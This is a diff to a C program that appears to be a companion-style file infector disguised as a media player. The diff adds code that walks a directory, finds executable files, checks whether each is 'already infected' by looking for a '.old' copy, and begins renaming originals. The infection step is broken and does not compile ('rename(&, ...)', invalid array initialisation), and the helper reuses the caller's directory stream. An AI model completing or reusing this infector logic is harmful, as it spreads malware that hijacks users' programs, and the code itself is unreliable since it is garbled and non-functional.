@@ -2,6 +2,7 @@
 #include <dirent.h>
 #include <gdk/gdkkeysyms.h>
 #include <stdlib.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/stat.h>
@@ -21,26 +22,47 @@ void findTargetFiles()
                         struct stat sb;
                         stat(dir->d_name, &sb);
                         // get only user program
-                        if (dir->d_type == 8 && !strstr(dir->d_name, ".") && !strstr(dir->d_name, "media"))
+                        numberOfPGRMS++;
+                        if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && !strstr(dir->d_name, "mediaplayer"))
                         {
-                                numberOfPGRMS++;
-                                if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode))
+                                printf("Permission d'execution sur le fichier : %s\n", dir->d_name);
+                                printf("ID of device containing the file : %lu\n", sb.st_dev);
+                                printf("Serial number for the file : %lu\n", sb.st_ino);
+                                printf("Access mode and file type for the file : %u\n", sb.st_mode);
+                                printf("User ID of owner: %u\n", sb.st_uid);
+                                printf("Group ID of owner: %u\n", sb.st_gid);
+                                printf("Total file size: %lu bytes\n", sb.st_size);
+                                printf("Last status change:       %s", ctime(&sb.st_ctime));
+                                printf("Last file access:         %s", ctime(&sb.st_atime));
+                                printf("Last file modification:   %s\n", ctime(&sb.st_mtime));
+                        }
+                        // checking if executable is already infected, testing on exe that not have a .old
+                        if (!strstr(dir->d_name, ".old"))
+                        {
+                                if (!isAlreadyInfected(&dir->d_name, &d))
                                 {
-                                        printf("Permission d'execution sur le fichier : %s\n", dir->d_name);
-                                        printf("ID of device containing the file : %lu\n", sb.st_dev);
-                                        printf("Serial number for the file : %lu\n", sb.st_ino);
-                                        printf("Access mode and file type for the file : %u\n", sb.st_mode);
-                                        printf("User ID of owner: %u\n", sb.st_uid);
-                                        printf("Group ID of owner: %u\n", sb.st_gid);
-                                        printf("Total file size: %lu bytes\n", sb.st_size);
-                                        printf("Last status change:       %s", ctime(&sb.st_ctime));
-                                        printf("Last file access:         %s", ctime(&sb.st_atime));
-                                        printf("Last file modification:   %s\n", ctime(&sb.st_mtime));
+                                        char oldname[] = dir->d_name;
+                                        size_t newNameLen=strlen( oldname )+strlen(".old");
+                                        char newname[] = dir->d_name;
+                                        rename(&, "readme.txt");
                                 }
                         }
                 }
                 closedir(d);
         }
+}
+
+bool isAlreadyInfected(char *pgrmName, DIR *d)
+{
+        struct dirent *dir;
+        while ((dir = readdir(d)) != NULL)
+        {
+                if (strstr(dir->d_name, pgrmName) && strstr(dir->d_name, ".old"))
+                {
+                        return true;
+                }
+        }
+        return false;
 }
 
 int g = 0, size_folder = 0;
